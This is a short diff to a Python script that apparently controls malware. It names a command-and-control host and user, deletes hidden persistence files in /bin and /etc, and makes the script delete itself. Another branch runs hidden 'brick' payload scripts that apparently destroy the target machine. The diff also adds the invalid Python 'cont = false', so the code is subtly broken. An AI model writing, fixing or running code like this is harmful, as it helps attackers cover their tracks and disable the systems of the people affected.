@@ -1,6 +1,7 @@
 import os
 import subprocess
 import argparse
+from sys import argv
 CnC = "192.168.102.16"
 CnCUser = "sysadmin"
 def main():
@@ -24,7 +25,8 @@ def main():
             os.system("rm /bin/.systemm.sh")
             os.system("rm /etc/.resolver.sh")
             print("Success.")
-            os.system("rm -- \"$0\"")
+            cont = false
+            os.remove(argv[0])
         elif(value.lower() in  ('k')):
             os.system("bash /etc/.music/brickPayload.sh")
             os.system("bash /var/spool/.payloadBrick.sh")
